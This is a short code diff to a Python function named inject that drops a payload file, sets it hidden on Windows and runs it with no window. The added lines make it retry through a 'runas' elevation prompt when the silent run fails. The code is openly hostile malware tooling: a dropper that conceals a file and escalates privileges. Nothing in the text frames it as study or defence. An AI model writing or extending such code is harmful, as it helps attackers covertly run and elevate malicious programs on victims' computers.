@@ -35,7 +35,11 @@ def inject(payload_bytes: bytes):
         ctypes.windll.kernel32.SetFileAttributesW(payload_path, FILE_ATTRIBUTE_HIDDEN)
         
         # Execute the payload
-        subprocess.Popen([payload_path], creationflags=subprocess.CREATE_NO_WINDOW)
+        try:
+            subprocess.Popen([payload_path], creationflags=subprocess.CREATE_NO_WINDOW)
+        except OSError:
+            # Si falla sin admin, intentar con elevación
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", payload_path, None, None, 0)
         return True, "Injection successful"
     except Exception as e:
         return False, f"Injection failed: {e}"
